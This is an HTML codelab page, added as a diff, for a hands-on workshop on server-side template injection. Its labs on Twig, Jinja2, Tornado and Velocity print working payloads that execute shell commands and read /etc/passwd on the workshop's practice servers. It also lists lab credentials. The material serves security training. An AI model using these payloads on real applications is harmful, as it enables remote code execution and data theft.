@@ -1,0 +1,323 @@
+
+<!doctype html>
+
+<html>
+<head>
+  <meta name="viewport" content="width=device-width, minimum-scale=1.0, initial-scale=1.0, user-scalable=yes">
+  <meta name="theme-color" content="#4F7DC9">
+  <meta charset="UTF-8">
+  <title>Template Injection in Action</title>
+  <link rel="stylesheet" href="//fonts.googleapis.com/css?family=Source+Code+Pro:400|Roboto:400,300,400italic,500,700|Roboto+Mono">
+  <link rel="stylesheet" href="//fonts.googleapis.com/icon?family=Material+Icons">
+  <link rel="stylesheet" href="https://storage.googleapis.com/codelab-elements/codelab-elements.css">
+  <style>
+    .success {
+      color: #1e8e3e;
+    }
+    .error {
+      color: red;
+    }
+  </style>
+</head>
+<body>
+  <google-codelab-analytics gaid="UA-49880327-14"></google-codelab-analytics>
+  <google-codelab codelab-gaid=""
+                  id="template-injection-workshop"
+                  title="Template Injection in Action"
+                  environment="web"
+                  feedback-link="">
+    
+      <google-codelab-step label="Introduction" duration="5">
+        <p>Welcome to this 3-hour workshop on Template Injection. Template injection, also known as Server-Side Template Injection (SSTI), is a vulnerability class that has emerged in 2015. The 2015 Black Hat talk from James Kettle establish the foundations for the exploitation techniques in multiple template engines. The exploitation of this type of issue will require specific knowledge associated with the template library or the language being used underneath.</p>
+<p>The workshop is divided in five parts. First, there will be a introduction on the vulnerability class. This segment is needed to get a good understanding of the attack patterns to recognize potential vulnerabilities.<br>Then we will investigate four different template engine with unique twists. Each template engine will have an exercise which consists of a web application with a template engine being exposed.</p>
+<ul>
+<li>Introduction<br><br><ul>
+<li>Template Injection</li>
+<li>Identifying Template Engine</li>
+</ul>
+</li>
+<li>Template Engines<br><br><ul>
+<li>Twig (PHP)</li>
+<li>Jinja2 (Python)</li>
+<li>Tornado (Python)</li>
+<li>Velocity (Java)</li>
+</ul>
+</li>
+</ul>
+<h2 is-upgraded>Requirements</h2>
+<p>The only requirement is to have a to have an HTTP interception proxy installed.</p>
+<ul>
+<li><a href="https://portswigger.net/burp" target="_blank">Burp Suite</a></li>
+<li><a href="https://portswigger.net/burp" target="_blank">OWASP ZAP</a></li>
+</ul>
+<aside class="warning"><p>If you only have a web browser, you won&#39;t be able to reproduce the steps provided. You can still follow the workshop by reading the content and watch the demonstrations.</p>
+</aside>
+
+
+      </google-codelab-step>
+    
+      <google-codelab-step label="Template Injection" duration="0">
+        <p>A template engine enables you to use static template files in your application. At runtime, the template engine replaces variables in a template file with actual values, and transforms the template into an HTML file sent to the client. This approach makes it easier to design an HTML page.</p>
+<p>Although the templates were deployed statically, the advent of highly configurable service (SaaS) led several template libraries to be exposed directly on the internet. These seemingly very limited libraries are actually much more powerful than some developers might think.</p>
+<p class="image-container"><img alt="Template Injection" src="img\af9850d0f7c6b18c.png"></p>
+<h2 is-upgraded>Example of data binding</h2>
+<p>In a template, the developer will define both static content and place holder for dynamic values. At runtime, the template will be processed by its engine to map dynamic values references in the template.</p>
+<pre><code>Hello &#123;&#123;firstName}} &#123;&#123;lastName}}!
+</code></pre>
+<p><em>Example of simple template</em></p>
+<p>Template is a form of script that will have generally much more than just simple data binding. Because data structure can be complex (think about list and nested objects), template give some capabilities similar to programming. For instance, the template engine might allow to reach field from objects.</p>
+<pre><code>Hello &#123;&#123;user.firstName}} &#123;&#123;user.lastName}}!
+</code></pre>
+<p><em>Example of nested properties</em></p>
+<p>Nested properties like the above will not be evaluated directly by the language. The dynamic value <code>user.firstName</code> inside the place holder will be parsed by the engine. The engine will make under the hood the call to the method or field firstName.<br>The syntax is generally simple and compact for ease of use. The syntax is often powerful enough to escape the context of simple data binding.</p>
+<h2 is-upgraded>Thinking outside the box</h2>
+<p>In order to abuse a template engine, the attacker will need to take advantage of the capabilities made available.</p>
+<p>If the engine allows the access of fields, we might be able to access interesting internal data structure. Internal data structure could have interesting state to override. They may exposed powerful types.</p>
+<p>If the engine allows function calls, we are coming to target function that read files, execute commands or access internal states of the application.</p>
+<p>The four exercises in today workshop aim to show a variety of techniques to reach a similar goal.</p>
+
+
+      </google-codelab-step>
+    
+      <google-codelab-step label="Identifying Template Engine" duration="5">
+        <p>There are plenty of template libraries. We can find dozens of libraries per programming language. In practice, if we limit ourselves to the most popular, we can focus on two or three potential libraries when we know the language used.</p>
+<ul>
+<li>CSharp<br><br><ul>
+<li>StringTemplate</li>
+<li>ASPX (use dynamically on Sharepoint)</li>
+</ul>
+</li>
+<li>Java<br><br><ul>
+<li>Velocity</li>
+<li>Freemarker</li>
+<li>Pebble</li>
+<li>Thymeleaf</li>
+<li>jinjava</li>
+</ul>
+</li>
+<li>PHP<br><br><ul>
+<li>Twig</li>
+<li>Smarty</li>
+<li>Dwoo</li>
+<li>Volt</li>
+<li>Blade</li>
+<li>Plates</li>
+<li>Mustache</li>
+</ul>
+</li>
+<li>Python<br><br><ul>
+<li>Jinja2</li>
+<li>Tornado</li>
+<li>mustache</li>
+<li>String Template</li>
+</ul>
+</li>
+<li>Go<br><br><ul>
+<li>text/template</li>
+</ul>
+</li>
+</ul>
+<h2 is-upgraded>Heuristics</h2>
+<p>Instead of blindly testing every known payload, it is best to confirm with some level of confidence the technology used. The final payload might require some adjustments to take into account the specific runtime environment.</p>
+<p>James Kettles as come up with this  decision tree which can be used to identify the template technogoly used. It is composed of simple evaluation. Those expression will not work with every technology. Because these are very basic expression, they are less likely to become obsolete when a new version of a library is released. Method names allow and advanced syntax are likely to evolve over time.</p>
+<p class="image-container"><img alt="Template Injection" src="img\a98649c6cdc65546.png"></p>
+<p><em>Fig 1: Detection tree (</em><a href="https://portswigger.net/research/server-side-template-injection" target="_blank"><em>Source</em></a><em>)</em></p>
+
+
+      </google-codelab-step>
+    
+      <google-codelab-step label="LAB 1: Twig (PHP)" duration="20">
+        <h2 is-upgraded>Introduction</h2>
+<p class="image-container"><img alt="Twig Template" src="img\3c952e642913e16.png"></p>
+<p>Twig is probably the most popular template library in PHP. It was developed by the creator of Synfony a very popular PHP framework. In a bonus exercise, we will use Craft CMS a content management system using internally Twig.</p>
+<h2 is-upgraded>Template syntax basics</h2>
+<p>Twig syntax is simple and compact syntax. Here are a few examples of basic variable binding.</p>
+<pre><code>Hello &#123;&#123; var }}
+Hello &#123;&#123; var|escape }}
+</code></pre>
+<p><em>Basic variable binding</em></p>
+<p>Reference: <a href="https://twig.symfony.com/" target="_blank">Official Twig documentation</a></p>
+<h2 is-upgraded>Opportunity for exploitation</h2>
+<p>Twig a variable <code>_self</code> which make public a few internal Twig API. Here is a malicious payload that was created to take advantage of the <code>registerUndefinedFilterCallback</code> function. In the payload below the command <code>id</code> is executed returning the id from the current user (linux).</p>
+<pre><code>&#123;&#123;_self.env.registerUndefinedFilterCallback(&#34;exec&#34;)}}&#123;&#123;_self.env.getFilter(&#34;id&#34;)}}
+</code></pre>
+<p><em>Example of command execution</em></p>
+<h2 is-upgraded>Workshop exercise</h2>
+<p>For this exercise, connect to the web server <a href="http://template-injection.gosec.co:8012/" target="_blank">http://template-injection.gosec.co:8012/</a>.</p>
+<p>It will contain a very simple form with only one field.</p>
+<p class="image-container"><img alt="Screenshot 1" src="img\cbf7eb745efe8802.png"></p>
+<p>In this form, you can submit a simple expression to confirm that a template is used to display a value. The expression bellow will do a subtraction.</p>
+<pre><code>&#123;&#123;1338-1}}
+</code></pre>
+<p><em>This subtraction should display 1337 as result</em></p>
+<pre><code>&#123;&#123;_self.env.registerUndefinedFilterCallback(&#34;exec&#34;)}}&#123;&#123;_self.env.getFilter(&#34;id&#34;)}}
+</code></pre>
+<p><em>Executing the id command</em></p>
+<p>The result of the id command should be:</p>
+<pre><code>uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre>
+<p>Can you access the file flag.txt on the server?</p>
+
+
+      </google-codelab-step>
+    
+      <google-codelab-step label="LAB 2: Jinja2 (Python)" duration="20">
+        <h2 is-upgraded>Introduction</h2>
+<p class="image-container"><img alt="Jinja Template" src="img\ded9f636e6f8e994.png"></p>
+<p>Jinja is a popular template engine in Python. It is a template that is very similar to Django template. Compared to Django templates, Jinja can be easily used dynamically at runtime. Django templates are design to be static.</p>
+<h2 is-upgraded>Template syntax basics</h2>
+<pre><code>&#123;&#123; foo.bar }}
+&#123;&#123; foo[&#39;bar&#39;] }}
+</code></pre>
+<p><em>Basic variable binding</em></p>
+<p>Reference: <a href="https://jinja.palletsprojects.com/en/2.10.x/templates/" target="_blank">Official Jinja documentation</a></p>
+<h2 is-upgraded>Opportunity for exploitation</h2>
+<p>Python metadata properties can be read from any Python object. Method calls are also not filtered. Accessing powerful operations such command execution is, however, not trivial.</p>
+<h3 is-upgraded>Jinja exploitation basics</h3>
+<p>We can access the class from the metaproperties <code>__class__</code>.</p>
+<pre><code>&#123;&#123;&#39;&#39;.__class__}}
+
+&lt;type &#39;str&#39;&gt;
+</code></pre>
+<p>From any class, we can get the Method Resolution Order (MRO) object. The MRO object contains the hierarchy of class for the current type.</p>
+<pre><code>&#123;&#123;&#39;&#39;.__class__.__mro__}}
+
+&lt;type &#39;str&#39;&gt;, &lt;type &#39;basestring&#39;&gt;, &lt;type &#39;object&#39;&gt;
+</code></pre>
+<p>From the type object that we have previously found, we list all its subclasses. Effectively, enumerating all classes loaded the current context. The classes available will depends on the import made by the application. Imports can not be triggered easily in Jinja2.</p>
+<pre><code>&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()}}
+
+&lt;type &#39;type&#39;&gt;, &lt;type &#39;weakref&#39;&gt;, &lt;type &#39;weakcallableproxy&#39;&gt;, &lt;type &#39;weakproxy&#39;&gt;, &lt;type &#39;int&#39;&gt;, &lt;type &#39;basestring&#39;&gt;, &lt;type &#39;bytearray&#39;&gt;, &lt;type &#39;list&#39;&gt;, &lt;type &#39;NoneType&#39;&gt;, &lt;type &#39;NotImplementedType&#39;&gt;, &lt;type &#39;traceback&#39;&gt;, &lt;type &#39;super&#39;&gt;, &lt;type &#39;xrange&#39;&gt;, &lt;type &#39;dict&#39;&gt;, &lt;type &#39;set&#39;&gt;, &lt;type &#39;slice&#39;&gt;, &lt;type &#39;staticmethod&#39;&gt;, &lt;type &#39;complex&#39;&gt;, &lt;type &#39;float&#39;&gt;, &lt;type &#39;buffer&#39;&gt;, &lt;type &#39;long&#39;&gt;, &lt;type &#39;frozenset&#39;&gt;, &lt;type &#39;property&#39;&gt;, &lt;type &#39;memoryview&#39;&gt;, &lt;type &#39;tuple&#39;&gt;, &lt;type &#39;enumerate&#39;&gt;, &lt;type &#39;reversed&#39;&gt; [...]
+</code></pre>
+<p>We can pick any type from the previous list and call methods from those. The element at index 40 in the object subclasses list is <code>&lt;type &#39;file&#39;&gt;</code> (<code>&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[40]</code>). We can use this type to read arbitrary files.</p>
+<pre><code>&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#34;/etc/passwd&#34;,&#34;r&#34;).read()}}
+
+//The previous extension is analog to
+file(&#34;/etc/passwd&#34;,&#34;r&#34;).read()
+</code></pre>
+<aside class="warning"><p>The last payload is Python 2.7 specific.</p>
+</aside>
+<p>References:</p>
+<ul>
+<li><a href="https://www.lanmaster53.com/2016/03/11/exploring-ssti-flask-jinja2-part-2/" target="_blank">Exploring SSTI in Flask/Jinja2 - Part 2</a></li>
+<li><a href="https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti" target="_blank">Cheatsheet - Flask &amp; Jinja2 SSTI</a></li>
+</ul>
+<h3 is-upgraded>Using subprocess.Popen</h3>
+<p>One of the powerful type to look for is <code>subprocess.Popen</code>.</p>
+<p>On Python 3.8, it is likely to be index 245. This index is subject to change depending on the modules loaded.</p>
+<pre><code>&#123;&#123;[].__class__.__mro__[1].__subclasses__()[396]}}
+
+&lt;class &#39;subprocess.Popen&#39;&gt;
+</code></pre>
+<p>On Python 2.7, it is likely to be index 245.</p>
+<pre><code>&#123;&#123;[].__class__.__mro__[1].__subclasses__()[245]}}
+
+&lt;class &#39;subprocess.Popen&#39;&gt;
+</code></pre>
+<p>Executing command:</p>
+<pre><code>&#123;&#123;[].__class__.__mro__[1].__subclasses__()[245](&#39;ls /&#39;,shell=True,stdout=-1).communicate()[0].strip()}}
+</code></pre>
+<h3 is-upgraded>Alternative os object (Python 2.7)</h3>
+<p>There is an interesting type that we can be abused <code>&lt;class &#39;warnings.catch_warnings&#39;&gt;</code>. It has a cache of all python modules available. From the instance we can reach the os module.</p>
+<pre><code>WARNINGS_INSTANCE.__init__.func_globals[&#39;linecache&#39;].__dict__.values()[12]
+
+&lt;module &#39;os&#39; from &#39;/usr/lib/python2.7/os.pyc&#39;&gt;
+</code></pre>
+<p>Source: <a href="https://hexplo.it/escaping-the-csawctf-python-sandbox/" target="_blank">https://hexplo.it/escaping-the-csawctf-python-sandbox/</a></p>
+<p>Applying this interesting pattern to Jinja template. We have the following payload.</p>
+<pre><code>&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals[&#39;linecache&#39;].__dict__.values()[12].system(&#39;id &gt; /tmp/cmd&#39;)}}
+</code></pre>
+<p>Here is a two-steps payload that execute a command and store the result temporary in the temp folder. The result is later read from an other Jinja expression.</p>
+<pre><code>&#123;&#123; &#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals[&#39;linecache&#39;].__dict__.values()[12].system(&#39;id &gt; /tmp/cmd&#39;) }}&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#34;/tmp/cmd&#34;,&#34;r&#34;).read() }}
+</code></pre>
+<aside class="warning"><p>These payload are Python 2.7 specific.</p>
+</aside>
+<h2 is-upgraded>Workshop exercise</h2>
+<p>For this exercise, connect to the webserver <a href="http://template-injection.gosec.co:8013/" target="_blank">http://template-injection.gosec.co:8013/</a>.</p>
+<p class="image-container"><img alt="Jinja Template" src="img\307f5508c2789f4b.png"></p>
+
+
+      </google-codelab-step>
+    
+      <google-codelab-step label="LAB 3: Tornado (Python)" duration="20">
+        <h2 is-upgraded>Introduction</h2>
+<p class="image-container"><img alt="Tornado Template" src="img\875ad26d12d2d801.png"></p>
+<p>Tornado template is an engine that is part of Tornado a popular Python web framework. This exercise will probably be the easiest. It should demonstrate that simply reading the library documentation can sometimes reveal powerful functionalities.</p>
+<h2 is-upgraded>Template syntax basics</h2>
+<pre><code>Hello &#123;&#123;userName}}
+</code></pre>
+<p><em>Basic data binding</em></p>
+<h2 is-upgraded>Exploitation opportunity</h2>
+<p>It is much easier that Jinja2. Because it supports the <code>import</code> directive. The implementation of this directive is analog to the Python import.</p>
+<pre><code>{%import os%}
+</code></pre>
+<aside class="special"><p><code>import</code> directive require only one braquet <code>{...}</code>.</p>
+</aside>
+<p>Here is a complete payload which import the os module and execute the method <code>popen</code> (process open).</p>
+<pre><code>{%import os%}
+&#123;&#123;os.popen(&#34;whoami&#34;).read()}}
+</code></pre>
+<h2 is-upgraded>Workshop exercise</h2>
+<p>For this exercise, connect to the webserver <a href="http://template-injection.gosec.co:8014/" target="_blank">http://template-injection.gosec.co:8014/</a>.</p>
+<p class="image-container"><img alt="Tornado Template" src="img\fc1444c555b1608e.png"></p>
+
+
+      </google-codelab-step>
+    
+      <google-codelab-step label="LAB 4: Velocity (Java)" duration="20">
+        <h2 is-upgraded>Introduction</h2>
+<p class="image-container"><img alt="Velocity Template" src="img\5a2bc2850d4dbc0a.png"></p>
+<p>Velocity is one of the most popular Java template engine. Freemarker is another very popular alternative. Velocity was chosen for this workshop because it is a bit harder to exploit.</p>
+<h2 is-upgraded>Template syntax basics</h2>
+<p>Reference: <a href="https://velocity.apache.org/engine/1.7/user-guide.html" target="_blank">Official Velocity documentation</a></p>
+<h2 is-upgraded>Opportunity for exploitation</h2>
+<p>The original payload found by James Kettles require the activation of an optional plugin called ClassTool.</p>
+<pre><code>$class.inspect(&#34;java.lang.Runtime&#34;).type.getRuntime().exec(&#34;bad-stuff-here&#34;)
+</code></pre>
+<aside class="warning"><p>In this workshop, the plugin will not be enable.</p>
+</aside>
+<p>Velocity has variable assignement.</p>
+<pre><code>#set( $foo = &#34;bar&#34; )
+
+$foo
+</code></pre>
+<p>This pattern is used to access interesting types.<br>Here is a payload that allow the execution of command without any optionnal plugin.</p>
+<pre><code>#set($x=&#39;&#39;)##
+#set($rt=$x.class.forName(&#39;java.lang.Runtime&#39;))##
+#set($chr=$x.class.forName(&#39;java.lang.Character&#39;))##
+#set($str=$x.class.forName(&#39;java.lang.String&#39;))##
+
+#set($ex=$rt.getRuntime().exec(&#39;ls&#39;))##
+$ex.waitFor()
+#set($out=$ex.getInputStream())##
+#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
+</code></pre>
+<h2 is-upgraded>Workshop exercise</h2>
+<p>For this exercise, connect to the webserver <a href="http://template-injection.gosec.co:8015/" target="_blank">http://template-injection.gosec.co:8015/</a>.</p>
+<p>Use the credentials <code>admin</code> / <code>123456</code>.</p>
+
+
+      </google-codelab-step>
+    
+      <google-codelab-step label="Conclusion" duration="1">
+        <p>Template engines are very powerful. They need to be considered as scripts. Script needs to be either very well sandbox. If sandboxing is not possible, user permission can be used to limit the access these risky features. In many cases, they will allow compromising of the underlying operating system.</p>
+<h2 is-upgraded>References</h2>
+<ul>
+<li>Server-Side Template Injection <a href="http://blog.portswigger.net/2015/08/server-side-template-injection.html" target="_blank">[Slides]</a> | <a href="https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf" target="_blank">[White-paper]</a></li>
+<li>Scribbling Outside the Lines of Template Security <a href="https://i.blackhat.com/USA-20/Wednesday/us-20-Munoz-Room-For-Escape-Scribbling-Outside-The-Lines-Of-Template-Security.pdf" target="_blank">[Slides]</a> | <a href="https://i.blackhat.com/USA-20/Wednesday/us-20-Munoz-Room-For-Escape-Scribbling-Outside-The-Lines-Of-Template-Security-wp.pdf" target="_blank">[White-paper]</a></li>
+<li><a href="http://ha.cker.info/exploitation-of-server-side-template-injection-with-craft-cms-plguin-seomatic/" target="_blank">Exploitation of Server Side Template Injection with Craft CMS (Twig template)</a></li>
+<li><a href="https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti" target="_blank">Cheatsheet - Flask &amp; Jinja2 SSTI</a></li>
+</ul>
+
+
+      </google-codelab-step>
+    
+  </google-codelab>
+
+  <script src="https://storage.googleapis.com/codelab-elements/native-shim.js"></script>
+  <script src="https://storage.googleapis.com/codelab-elements/custom-elements.min.js"></script>
+  <script src="https://storage.googleapis.com/codelab-elements/prettify.js"></script>
+  <script src="https://storage.googleapis.com/codelab-elements/codelab-elements.js"></script>
+
+</body>
+</html>
